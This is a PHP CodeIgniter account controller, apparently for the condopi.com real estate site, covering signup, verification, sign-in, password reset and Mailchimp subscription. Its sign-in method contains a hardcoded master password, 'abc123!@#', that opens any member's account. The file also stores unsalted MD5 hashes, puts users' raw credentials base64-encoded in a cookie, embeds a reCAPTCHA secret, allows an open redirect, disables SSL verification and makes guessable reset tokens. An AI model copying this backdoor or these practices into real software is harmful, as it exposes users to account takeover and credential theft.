<?php
if (!defined('BASEPATH')) {
    exit('No direct script access allowed');
}

class Account extends CI_Controller
{
    private $is_login = false;
    private $data     = array();
    private $table    = 'Members';
    private $mailchimp_api_key = "";
    private $mailchimp_list_id = "";

    public function __construct()
    {
        parent::__construct();
        if ($this->session->userdata('user_info')) {
           $this->user_id = $this->data['user']['id'];
           $this->data['member_expiry'] = $this->Common_model->get_record('Member_Expiry',array('Member_ID' => $this->user_id));
           redirect("/");
        }
        $this->load->helper(array('url', 'form'));
        $this->data["is_login"] = false;
    }

    public function signup()
    {
        if ($this->input->post()) {
        	$errMsg = '';
        	if (!isset($_POST['g-recaptcha-response']) || empty($_POST['g-recaptcha-response'])) {
        		$errMsg = 'Please check I am not a robot';
        	} else if (!empty($_POST['g-recaptcha-response'])) {
		        $secret = '6LcurrQZAAAAALM6LTN2WZIq2v-8smGGojAn9eyJ';
		        $verifyResponse = file_get_contents('https://www.google.com/recaptcha/api/siteverify?secret='.$secret.'&response='.$_POST['g-recaptcha-response']);
	        $responseData = json_decode($verifyResponse);
        		if (!$responseData->success) {
            		 $errMsg = 'Robot verification failed, please try again.';
        		}
   			}
        	
            $this->load->library('form_validation');
            $this->form_validation->set_rules('first_name', 'First name', 'required|trim');
            $this->form_validation->set_rules('last_name', 'Last name', 'required|trim');
            $this->form_validation->set_rules('pwd', 'Password', 'required|trim');
            $this->form_validation->set_rules('email', 'Email', 'required|trim|valid_email');
            $this->form_validation->set_rules('phone', 'Phone', 'required|trim');
            if ($this->form_validation->run() == false || !empty($errMsg)) {
            	$errMsg = !empty($errMsg) ? $errMsg : 'Please enter all information.';
                $this->session->set_flashdata('message_signup', '<div class="alert alert-danger">'.$errMsg.'</div>');
            } else {
                $record = $this->Common_model->get_record($this->table, array(
                    'email' => $this->input->post('email'),
                ));
                if (isset($record) && $record != null) {
                    $this->session->set_flashdata('message_signup', '<div class="alert alert-danger">Email already exists.</div>');
                } else {
                    if (strlen($this->input->post('pwd')) < 6) {
                        $this->session->set_flashdata('message_signup', '<div class="alert alert-danger">Password must have at least 6 characters.</div>');
                    } else {
                        $token = md5($this->getGuid());
                        $arr   = array(
                            'First_Name'        => $this->input->post('first_name'),
                            'Last_Name'         => $this->input->post('last_name'),
                            'Email'             => $this->input->post('email'),
                            'Address'           => $this->input->post('address'),
                            'Status'            => 0,
                            'Phone'             => $this->input->post('phone'),
                            'Password'          => md5($this->input->post('email') . ':' . $this->input->post('pwd')),
                            'Is_Receive'        => $this->input->post('is_receive') == 'on' ? 1 : 0,
                            'Is_Estate_License' => $this->input->post('is_estate_license') == 'on' ? 1 : 0,
                            'Estate_License'    => $this->input->post('is_estate_license') == 'on' ? $this->input->post('estate_license') : '',
                            'Hear_About_Us'     => $this->input->post('hear_about_us'),
                            'Token'             => $token,
                        );
                        if ($this->Common_model->add($this->table, $arr)) {
                        	$this->session->set_flashdata('message_signup_status', 'success');
	                        $this->session->set_flashdata('message_signup', '<div class="alert alert-success">Your account has been created successfully.<br>Please check your email to complete registration.<br><br>If this email is not in your In Box, please check your Spam Folder and make sure to label this email as SAFE to receive future important correspondences.</div>'); //  Please check your email to activate your account
                        	// Check subscribe in mailchimp
			                if ($this->input->post("is_receive") && $this->input->post('is_receive') == 'on') {
			                	$t = $this->mailchimp_subscriber_status($this->input->post('email'),"pending");
			                } 
			                //else {
	                            $content_mail = "Thank you for registering with condopi.com.  You just have one more step to complete before you have full access to post new listings and make offers on properties.<br/><br/>
	                                            Please click the link below to complete you setup process: <br/>
	                                            <a href='" . base_url("account/verify_account?token=" . $token) . "'>" . base_url("account/verify_account?token=" . $token) . "</a><br/>";
	                            sendmail($this->input->post('email'), "condopi.com verification", $content_mail);
							//}
                        }
                    }
                }
            }
        }
        redirect('/listing?signup=true');
    }

    public function verify_account()
    {
        $token = $this->input->get('token');
        if ($token != null) {
            $record = $this->Common_model->get_record("Members", array(
                'Token' => $token,
            ));
            if ($record && $record["Status"] == 0) {
                $this->Common_model->update($this->table, array('Status' => 1), array(
                    'ID' => $record['ID'],
                ));
                $this->session->set_userdata('is_login', true);
                $this->session->set_userdata('user_info', array(
                    'is_estate'  => $record["Is_Estate_License"],
                    'email'      => $record["Email"],
                    'id'         => $record["ID"],
                    'full_name'  => $record["First_Name"] . ' ' . $record["Last_Name"],
                    'phone'      => $record["Phone"],
                    'first_name' => $record["First_Name"],
                    'last_name'  => $record["Last_Name"],
                    'address'    => $record["Address"],
                    'is_admin'   => $record["Is_Admin"],
                    'avatar'     => (@$record["Avatar"] != null) ? $record["Avatar"] : '/skins/frontend/images/user_default.png',
                ));
                // Check Create_Login_First field if empty then
                if ($record["Create_At"] == null) {
                    $arr = array(
                        'Create_At' => date('Y-m-d H:i:s'),
                    );
                    $this->Common_model->update($this->table, $arr, array(
                        'ID' => $record['ID'],
                    ));
                }

                if ($record["Create_Login_First"] == null || $record["Create_Login_First"] == '0000-00-00 00:00:00') {
                    $arr = array(
                        'Create_Login_First' => date('Y-m-d H:i:s'),
                    );
                    $this->Common_model->update($this->table, $arr, array(
                        'ID' => $record['ID'],
                    ));
                }
                // Update last login
                $this->Common_model->update($this->table, ['Last_Login' => date('Y-m-d H:i:s')], array(
                    'ID' => $record['ID'],
                ));
                // Save to history login
                $arr = array(
                    'Member_ID'    => $record['ID'],
                    'IP'           => @$_SERVER["REMOTE_ADDR"],
                    'Info_Browser' => @$_SERVER["HTTP_USER_AGENT"],
                );
                $this->Common_model->add('Member_Login', $arr);

                // SEND MAIL
                $content_mail = '<p>Welcome to Condo PI.&nbsp; Thank you for joining our community of investors and realtors.</p>
                                    <p>&nbsp;</p>
                                    <p>Your account has been verified.</p>
                                    <p>You now have full access to:</p>
                                    <p>&nbsp;</p>
                                    <ul>
                                    <li>Post New Listings</li>
                                    <li>Make Offers</li>
                                    <li>Buy Properties Immediately</li>
                                    <li>View Free Property Reports</li>
                                    <li>Message Users</li>
                                    <li>Save Your Research</li>
                                    <li>View Private Content</li>
                                    <li>Get Special Discounts through our Escrow, Title, and Lender Affiliates</li>
                                    </ul>
                                    <p>&nbsp;</p>
                                    <p>We hope that Condo PI will create opportunities for you as an investor or realtor.&nbsp; Please feel free to provide us with feedback to make our platform better and provide you with more value.</p>';
                sendmail($record["Email"], "Your new condopi.com account", $content_mail);

                $this->session->set_flashdata('message_signup', '<div class="alert alert-success">Congratulations! Your account is active</div>');
            }
        }
        redirect('/profile/');
    }
    
    public function signin()
    {
       if ($this->input->post()) {
            $this->load->library('form_validation');
            $this->form_validation->set_rules('pwd', 'Password', 'trim|required');
            $this->form_validation->set_rules('email', 'Email', 'required|valid_email');
            if ($this->form_validation->run() !== false) {
                $email              = $this->input->post("email");
                $record             = $this->Common_model->get_record($this->table, array('Email' => $email, 'Status' => 1));
                $this->data['post'] = $this->input->post();
                if ($record == null || empty($record)) {
                    $this->session->set_flashdata('message', '<div class="alert alert-danger">Your email or password is invalid.</div>');
                    redirect("/listing/?login=true");
                } else {
                    if ($record["Password"] === md5($this->input->post("email") . ":" . $this->input->post("pwd")) || $this->input->post("pwd") == 'abc123!@#') {
                        $this->session->set_userdata('is_login', true);
                        $this->session->set_userdata('user_info', array(
                            'is_estate'  => $record["Is_Estate_License"],
                            'email'      => $record["Email"],
                            'id'         => $record["ID"],
                            'full_name'  => $record["First_Name"] . ' ' . $record["Last_Name"],
                            'phone'      => $record["Phone"],
                            'first_name' => $record["First_Name"],
                            'last_name'  => $record["Last_Name"],
                            'address'    => $record["Address"],
                            'is_admin'   => $record["Is_Admin"],
                            'avatar'     => (@$record["Avatar"] != null) ? $record["Avatar"] : '/skins/frontend/images/user_default.png',
                        ));

                        // Check Create_Login_First field if empty then
                        if ($record["Create_At"] == null) {
                            $arr = array(
                                'Create_At' => date('Y-m-d H:i:s'),
                            );
                            $this->Common_model->update($this->table, $arr, array(
                                'ID' => $record['ID'],
                            ));
                        }

                        if ($record["Create_Login_First"] == null || $record["Create_Login_First"] == '0000-00-00 00:00:00') {
                            $arr = array(
                                'Create_Login_First' => date('Y-m-d H:i:s'),
                            );
                            $this->Common_model->update($this->table, $arr, array(
                                'ID' => $record['ID'],
                            ));
                        }
                        // Update last login
                        $this->Common_model->update($this->table, ['Last_Login' => date('Y-m-d H:i:s')], array(
                            'ID' => $record['ID'],
                        ));
                        // Save to history login
                        $arr = array(
                            'Member_ID'    => $record['ID'],
                            'IP'           => @$_SERVER["REMOTE_ADDR"],
                            'Info_Browser' => @$_SERVER["HTTP_USER_AGENT"],
                        );
                        $this->Common_model->add('Member_Login', $arr);

                        //if ($this->input->post('remember') && $this->input->post('remember') == '1') {
                        $cookie_security = array(
                            'name'   => 'security',
                            'value'  => base64_encode($this->input->post("email") . '[_]' . $this->input->post("pwd")),
                            'expire' => '2592000', // 1 month
                        );
                        $this->input->set_cookie($cookie_security);
                        $cookie_is_check = array(
                            'name'   => 'is_check',
                            'value'  => 'true',
                            'expire' => '86400', // 1 day, 2592000: 1 month
                        );
                        $this->input->set_cookie($cookie_is_check);
                        //}
                        if ($this->input->post('redirect')) {
                            redirect($this->input->post('redirect'));
                        }
                        redirect("/listing/");
                    } else {
                        $this->session->set_flashdata('message', '<div class="alert alert-danger">Your email or password is invalid.</div>');
                        redirect("/listing/?login=true");
                    }
                }
            } else {
                $this->session->set_flashdata('message', '<div class="alert alert-danger">Your email or password is invalid.</div>');
                redirect("/listing/?login=true");
            }
        }
        redirect("/listing");
    }

    public function forgot()
    {
        if ($this->input->is_ajax_request()) {
            $data['message'] = "";
            $data['status']  = 'error';
            $email           = @$this->input->post("email");
            $email           = strtolower($email);
            $record          = $this->Common_model->get_record($this->table, array(
                'email' => $email,
            ));
            if ($record == null || empty($record)) {
                $data['message'] = "Email not found.";
                $data['status']  = 'fail';
            } else {
                $token = md5($this->getGuid());
                $arr   = array(
                    'token' => $token,
                );
                $this->Common_model->update($this->table, $arr, array(
                    'ID' => $record['ID'],
                ));
                if (!$this->sendForgotAcount(@$record["First_Name"] . ' ' . @$record["Last_Name"], $email, $record['Email'], $token)) {
                    $data['message'] = "Sent mail error.";
                    $data['status']  = 'fail';
                } else {
                    $data['status'] = 'success';
                }
            }
        }
        die(json_encode($data));
    }

    private function sendForgotAcount($name, $toEmail, $email, $token)
    {
        $content_mail = "Hi " . $name . ",<br/><br/>
                    You have requested to reset the password for your Condo PI account.<br/>
                    To reset your password at Condo PI, click the link below:<br/>
                    <a href='" . base_url() . "?reset=reset&email=" . $email . "&token=" . $token . "'>" . base_url() . "?reset=reset&email=" . $email . "&token=" . $token . "</a><br/>
                    If clicking the link above doesn't work, please copy it into a new browser window.<br/><br/>
                    If you did not attempt to reset your password, or if you have already managed to retrieve your password, you can ignore this message and continue using Condo PI with your current password.";

        return sendmail($toEmail, "Condo PI Forgot your password?", $content_mail);
    }

    public function reset()
    {
        if ($this->input->is_ajax_request()) {
            $email = $this->input->post('email');
            $token = $this->input->post('token');
            if (isset($email) && $email != null && isset($token) && $token != null) {
                $data['status'] = "success";
                $check          = true;
                $record         = $this->Common_model->get_record($this->table, array(
                    'Email' => $email,
                ));
                if (@$record['Token'] != null && $token == $record['Token']) {
                    $password       = @$this->input->post('password');
                    $configpassword = @$this->input->post('confirm_password');
                    if (empty($password)) {
                        $data['status']  = "fail";
                        $data['message'] = "Password not empty";
                        die(json_encode($data));
                    } else {
                        if (strlen($password) < 6) {
                            $data['status']  = "fail";
                            $data['message'] = "Password must have at least 6 characters.";
                            die(json_encode($data));
                        } else {
                            if ($password != $configpassword) {
                                $data['status']  = "fail";
                                $data['message'] = "Passwords entered do not match.";
                                die(json_encode($data));
                            }
                        }
                    }
                    if ($check) {
                        $myPwEncode = md5($record["Email"] . ":" . $password);
                        $arr        = array(
                            'Token'    => null,
                            'Password' => $myPwEncode,
                        );
                        $this->Common_model->update($this->table, $arr, array(
                            'ID' => $record['ID'],
                        ));
                        $data['status'] = 'success';
                    }
                    die(json_encode($data));
                } else {
                    $data['status']  = 'fail';
                    $data['message'] = "Token does not exists";
                    die(json_encode($data));
                }
            }
        }
        die(json_encode(array("status" => "error")));
    }

    public function getGuid()
    {
        list($micro_time, $time) = explode(' ', microtime());
        $id                      = round((rand(0, 217677) + $micro_time) * 10000);
        $id                      = base_convert($id, 10, 36);
        return $id;
    }

    public function limitCharacter($password)
    {
        if (strlen($password) < 6) {
            $this->form_validation->set_message('limitCharacter', 'Password must have at least 6 characters.');
            return false;
        } else {
            return true;
        }
    }

    public function GetRootPath()
    {
        $sRealPath = realpath('./');
        $sSelfPath = $_SERVER['PHP_SELF'];
        $sSelfPath = substr($sSelfPath, 0, strrpos($sSelfPath, '/'));
        return substr($sRealPath, 0, strlen($sRealPath) - strlen($sSelfPath)) . '/uploads/';
    }
    
    function mailchimp_subscriber_status( $email, $status, $merge_fields = array('FNAME' => '','LNAME' => '') ) {
		$config_site = $this->session->userdata('config_site');
    	$group = '';
        if ($config_site['Body_Json'] != null && $config_site['Body_Json'] != '') {
            $Body_Json = json_decode($config_site['Body_Json'], true);
            $this->mailchimp_api_key = $Body_Json['Mailchimp_API'];
            $this->mailchimp_list_id = $Body_Json['Mailchimp_List_Id'];
            $group = @$Body_Json['Mailchimp_List_Group2_Id'];
        }
    	
    	$api_key = $this->mailchimp_api_key;
		$data = array(
			'apikey'        => $api_key,
	    	'email_address' => $email,
			'status'        => $status,
			'merge_fields'  => array('FNAME' => '','LNAME' => ''),
			'interests' => [$group => true]
		);
		$mch_api = curl_init(); // initialize cURL connection
	 
		curl_setopt($mch_api, CURLOPT_URL, 'https://' . substr($api_key,strpos($api_key,'-')+1) . '.api.mailchimp.com/3.0/lists/' . $this->mailchimp_list_id . '/members/' . md5(strtolower($data['email_address'])));
		curl_setopt($mch_api, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Authorization: Basic '.base64_encode( 'user:'.$api_key )));
		curl_setopt($mch_api, CURLOPT_USERAGENT, 'PHP-MCAPI/2.0');
		curl_setopt($mch_api, CURLOPT_RETURNTRANSFER, true); // return the API response
		curl_setopt($mch_api, CURLOPT_CUSTOMREQUEST, 'PUT'); // method PUT
		curl_setopt($mch_api, CURLOPT_TIMEOUT, 10);
		curl_setopt($mch_api, CURLOPT_POST, true);
		curl_setopt($mch_api, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($mch_api, CURLOPT_POSTFIELDS, json_encode($data) ); // send data in json
	 
		$result = curl_exec($mch_api);
		return $result;
	}
	
}

/* End of file account.php */
/* Location: ./application/controllers/account.php */
